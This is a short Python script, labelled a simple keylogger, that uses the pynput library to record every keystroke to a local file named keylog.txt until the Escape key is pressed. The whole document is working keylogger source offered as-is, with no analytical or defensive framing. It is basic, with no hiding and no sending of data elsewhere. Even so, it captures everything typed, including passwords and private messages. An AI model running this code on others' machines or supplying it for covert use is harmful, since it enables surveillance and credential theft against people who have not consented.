#simple keylogger
from pynput import keyboard
# Path to save the log file
log_file_path = "keylog.txt"

# Function to write key strokes to log file
def on_press(key):
    try:
        with open(log_file_path, "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        with open(log_file_path, "a") as log_file:
            log_file.write(f"{key}")

# Function to handle release of keys (optional)
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
    

